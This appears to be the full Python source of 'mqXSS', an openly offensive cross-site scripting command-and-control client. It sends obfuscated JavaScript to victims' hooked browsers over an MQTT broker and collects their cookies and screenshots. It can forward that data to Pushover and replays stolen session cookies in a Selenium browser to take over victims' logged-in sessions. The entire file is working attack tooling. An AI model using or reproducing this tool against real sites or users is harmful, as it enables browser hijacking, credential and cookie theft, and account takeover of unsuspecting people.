#!/usr/bin/python3
#mqxss client, send javascript commands to hooked browsers over mqtt wss connections
import paho.mqtt.client as mqtt
import sessions
import generate
import sys
import os
import sqlite3
import pandas as pd 
import threading
import requests
import base64
import argparse
import signal
import string
import random
from http.cookies import SimpleCookie
from selenium import webdriver
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service as FirefoxService
from urllib.parse import urlparse
from webdriver_manager.firefox import GeckoDriverManager
from rich import print
from rich.prompt import Prompt
from rich.markup import escape
from os import getcwd
from pathlib import Path

# Cli arguments
parser = argparse.ArgumentParser(description="mqXSS: XSS client using websockets over mqtt", formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("-b", dest="broker", required=True, help="Broker domain name")
parser.add_argument("-p", dest="bport", required=True, help="Broker port")
parser.add_argument("-t", dest="btopic", required=True, help="Base topic")
parser.add_argument("-u", dest="buser", required=False, help="Broker user name")
parser.add_argument("-pw", dest="bpasswd", required=False, help="Broker password")
parser.add_argument("-g", dest="generate", required=False, help="Generate JS file to hook browsers with", action="store_true")
parser.add_argument("-po", dest="push", required=False, help="Send hooked browser responses to pushover", action="store_true")
parser.add_argument("-js", dest="js", required=False, help="Send javascript to hooked browsers")

args = parser.parse_args()
if len(sys.argv)==1:
	parser.print_help(sys.stderr)
	sys.exit(1)

mbroker = args.broker
mport = args.bport
mtopic = args.btopic
muser = args.buser
mpasswd = args.bpasswd
gen = args.generate
ppush = args.push
jsarg = args.js
# banner
mqxss = '''
                   ___ ___   _______  _______ 
.--------..-----. (   Y   ) |   _   ||   _   |
|        ||  _  |  \  1  /  |   1___||   1___|
|__|__|__||__   |  /  _  \  |____   ||____   |
             |__| /:  |   \ |:  1   ||:  1   |
                 (::. |:.  )|::.. . ||::.. . |
                  `--- ---' `-------'`-------'
                                      v0_2    
    
Commands:   'hooked' view hooked browsers.
	    'unhooked' view unhooked browsers.
	    'cookies' view captured cookies.
	    'browse' open browser with cookies.
	    'js' send javascript to hooked browser.
	    'help' this screen.
	    'exit' to leave.
'''
print(mqxss)

# Define subscriptions folders and var
cwd = getcwd()
topic_out = mtopic+"/out/#"
topic_cmd = mtopic+"/cmd/"
topic_ss = mtopic+"/ss/#"
topic_rdy = mtopic+"/rdy/#"
topic_js = mtopic+"/jsout/#"
scdir = cwd+"/screenshots/"
Path(scdir).mkdir(parents=True, exist_ok=True)
mport2 = int(mport)

# handle sig
def handler(signum, frame):
	res = input(" Ctrl-c was pressed. Do you really want to exit? y/n ")
	if res == 'y':
		exit(1)
signal.signal(signal.SIGINT, handler)

# pushover variables
ptoken = "set pushover token here"
userkey = "set user key here"
pdevice = ""
if ppush:
	print("[[grey82]mqXSS[/grey82]] Sending hooked browser responses to pushover device")

# mqtt handlers
def on_connect(client, userdata, flags, rc):
	client.subscribe([(topic_out,1),(topic_ss,1),(topic_rdy,1)])
	print("[[grey82]mqXSS[/grey82]] Subscribed to [grey78]"+mtopic+"[/grey78] topic, at broker [grey78]"+mbroker+"[/grey78] on port [grey78]"+escape(mport)+"[/grey78]")
def on_message(client, userdata, msg):
	vicid = msg.topic.split("/")[2]
	output = str(msg.payload.decode('UTF-8'))
	str1 = ''.join([chr(int(output[i:i+2], 16)-1) for i in range(0, len(output), 2)])
	str2 = escape(str1)
	print("[[grey82]mqXSS[/grey82]] [grey89]"+str2+"[/grey89] ", end="\n")
	if "XSS fired" in str2:
		sessions.addhook(str2, mbroker, mport, mtopic)
	if "Cookies" in str2:
		sessions.addhook2(str2)
	if "Disconnected" in str2:
		sessions.remhook(str2)
	if "Reconnected" in str2:
		sessions.rechook(str2)
	if ppush:
		#send messages to pushover
		data = { "token": ptoken, "user": userkey, "title": "Message received from "+vicid , "message": str1, "device": pdevice}
		try:
			r = requests.post("https://api.pushover.net/1/messages.json", data = data)
		except Exception as e:
			print(e)

# get download
def on_download(client, userdata, msg):
	on_download.vicid = msg.topic.split("/")[2]
	ran = ''.join(random.choices(string.ascii_lowercase, k=5))
	file1 = on_download.vicid+"-"+ran+".png"
	filename = scdir+file1
	save_download(msg.payload, filename, file1)
	
#download the screenshot
def save_download(payload, filename, file1):
	with open(filename, "wb") as fh:
		decodedimg = base64.b64decode(payload)
		fh.write(decodedimg)
		sessions.addhook3(on_download.vicid, file1)
	print("[[grey82]mqXSS[/grey82]] [grey89]"+on_download.vicid+": Screenshot saved as "+escape(filename)+"[/grey89]")
	if ppush:
		#send image to pushover
		files = { "attachment": (filename, open(filename, "rb"), "image/png") }
		data = { "token": ptoken, "user": userkey, "message": "Screenshot received from "+on_download.vicid , "device": pdevice}
		try:
			r = requests.post("https://api.pushover.net/1/messages.json", data = data, files = files)
		except Exception as e:
			print(e)

# browser is ready
def on_rdy(client, userdata, msg):
	if jsarg:
		vicid = msg.topic.split("/")[2]
		tcmd = topic_cmd+vicid;
		print("[[grey82]mqXSS[/grey82]][grey89]"+escape(vicid)+": Sending JS[/grey89] ")
		sjg = ''.join(hex(ord(e)+1)[2:] for e in jsarg)
		client.publish(tcmd, sjg)
		
#handle user prompt and sending of js
def sendjs():
	while True:
		burg = input()
		try:
			if burg == "js":
				vicid2 = Prompt.ask("[[grey82]mqXSS[/grey82]][grey89] Enter client ID to send JS[/grey89]")
				vicid3 = sessions.getagent(vicid2)
				if vicid3 is None:
					continue
				tcmd = topic_cmd+vicid3;
				jsarg2 = Prompt.ask("[[grey82]mqXSS[/grey82]][grey89] Enter JS to send")
				print("[[grey82]mqXSS[/grey82]] [grey89]"+vicid3+": Sending JS[/grey89] ")
				sjg = ''.join(hex(ord(e)+1)[2:] for e in jsarg2)
				client.publish(tcmd, sjg)
			if burg == "browse":
				cookid = Prompt.ask("[[grey82]mqXSS[/grey82]][grey89] Enter cookies ID to open in browser[/grey89]")
				cookid2 = sessions.getlocook(cookid)
				if cookid is None:
					continue
				else:
					browse(sessions.getlocook.location, sessions.getlocook.cookies)
			elif burg == "hooked":
				sessions.gethooked()
			elif burg == "unhooked":
				sessions.getunhooked()
			elif burg == "cookies":
				sessions.monster()
			elif burg == "help":
				print(mqxss)
			elif burg == "exit":
				os._exit(1)
		except Exception as e:
			print(e)
#main mqtt handlers
def mqttproc():
	try:
		client.connect(mbroker, mport2, keepalive=20)
	except Exception as e:
		print("[[grey66]mqXSS[/grey66]] "+str(e))
		exit(1)
	client.loop_forever()

#open browser
def browse(location, cookie):
	cookie1 = SimpleCookie()
	cookie1.load(cookie)
	cookies = {}
	fireFoxOptions = webdriver.FirefoxOptions()
	fireFoxOptions.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
	fireFoxOptions.setAcceptInsecureCerts = True
	fireFoxOptions.setAssumeUntrustedCertificateIssuer = True
	fireFoxOptions.accept_untrusted_certs = True
	fireFoxOptions.headless = False
	driver = webdriver.Firefox(options=fireFoxOptions)
	driver.set_page_load_timeout(15)
	location.replace('=', ':')
	driver.get(location)
	for key, morsel in cookie1.items():
		driver.add_cookie({"name": morsel.key, 'value': morsel.value})

tmqtt=threading.Thread(target=mqttproc)
sjs=threading.Thread(target=sendjs)

if __name__ == "__main__":
	sessions.chooked()
	sessions.cunhooked()
	client = mqtt.Client(transport='websockets',client_id="crinkle-dinos",clean_session=False)
	client.tls_set()
	client.message_callback_add(topic_ss,on_download)
	client.message_callback_add(topic_out,on_message)
	client.message_callback_add(topic_rdy,on_rdy)
	client.on_connect = on_connect
	if muser:
		client.username_pw_set(username=muser,password=mpasswd)
	else:
		muser = ""
		mpasswd = ""
	if gen:
		generate.ws(mbroker, mport, mtopic, muser, mpasswd)
		print("[[grey82]mqXSS[/grey82]] JS payload created at "+generate.ws.barbosa)
	tmqtt.start()
	sjs.start()
